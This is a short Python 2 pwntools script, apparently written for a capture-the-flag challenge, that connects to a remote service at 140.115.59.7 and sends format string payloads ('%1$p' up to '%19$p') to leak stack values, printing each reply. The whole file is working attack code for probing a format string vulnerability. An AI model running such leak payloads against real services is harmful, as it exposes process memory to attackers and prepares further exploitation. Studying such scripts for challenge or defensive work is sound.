from pwn import *
import re

host = '140.115.59.7'
port = 11009
y = remote( host , port )

def pp(pay):
    p = 'START|' + pay + '|END'
    y.sendline(p)



for i in range(1,20):
    p = ''
    p += '%' + str(i) + '$p'
    y.sendline(p)
    try:
        #a = re.findall('..',y.recv(1024)[200:].rjust(8,'0'))
        #b = ''.join( chr(int(c,16)) for c in a )
        #print b[::-1]
        print y.recv(1024)
    except:
        continue
